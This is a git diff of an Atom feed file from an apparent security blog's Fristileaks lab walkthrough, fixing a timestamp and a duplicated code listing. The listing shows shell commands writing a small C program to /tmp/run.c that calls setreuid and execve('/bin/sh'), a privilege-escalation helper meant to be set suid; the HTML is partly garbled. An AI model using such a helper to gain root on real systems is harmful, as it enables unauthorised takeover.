@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Fristileaks | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/fristileaks/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-12-15T09:17:53+01:00</updated>
+  <updated>2015-12-15T09:19:52+01:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -364,22 +364,6 @@ and set suid permission using admin&rsquo;s account:</p>
 <span class='line-number'>14</span>
 <span class='line-number'>15</span>
 <span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ echo &lsquo;#include &lt;stdio.h>&lt;/p>
 </span><span class='line'>
 </span><span class='line'>&lt;h1>include &lt;stdlib.h>&lt;/h1>
@@ -395,23 +379,7 @@ and set suid permission using admin&rsquo;s account:</p>
 </span><span class='line'>
 </span><span class='line'>&lt;p>   return 0;
 </span><span class='line'>}
-</span><span class='line'>&lsquo; > /tmp/run.cecho &rsquo;#include &lt;stdio.h>&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;blockquote>&lt;h1>include &lt;stdlib.h>&lt;/h1>
-</span><span class='line'>
-</span><span class='line'>&lt;h1>include &lt;sys/types.h>&lt;/h1>
-</span><span class='line'>
-</span><span class='line'>&lt;h1>include &lt;unistd.h>&lt;/h1>
-</span><span class='line'>
-</span><span class='line'>&lt;p>int main()
-</span><span class='line'>{
-</span><span class='line'>   setreuid(geteuid(),geteuid());
-</span><span class='line'>   execve(&ldquo;/bin/sh&rdquo;, NULL, NULL);&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>   return 0;
-</span><span class='line'>}&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>&lsquo; > /tmp/run.c</span></code></pre></td></tr></table></div></figure></p></blockquote>
+</span><span class='line'>&lsquo; > /tmp/run.c</span></code></pre></td></tr></table></div></figure></p>
 
 <p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
